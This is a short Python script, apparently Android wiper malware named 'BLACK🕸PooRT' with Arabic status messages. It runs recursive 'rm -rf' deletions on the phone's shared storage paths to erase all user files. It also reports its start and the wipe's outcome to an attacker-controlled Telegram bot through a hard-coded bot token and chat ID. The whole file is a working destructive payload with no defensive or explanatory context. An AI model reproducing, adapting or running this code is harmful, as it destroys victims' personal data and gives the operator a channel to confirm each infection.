
import os
import requests

BOT_TOKEN = "7574208471:AAFNp-E7e6YgkBasnka8rtHvdi4ooCi7cJc"
CHAT_ID = "7976460613"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def format_device():
    try:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /storage/emulated/0/*")
        send_telegram_message("🧨 تم تنفيذ سكربت BLACK🕸PooRT وتم حذف بيانات الجهاز بالكامل.")
    except Exception as e:
        send_telegram_message(f"❌ فشل التنفيذ: {str(e)}")

if __name__ == "__main__":
    send_telegram_message("🚀 تشغيل BLACK🕸PooRT على الجهاز...")
    format_device()
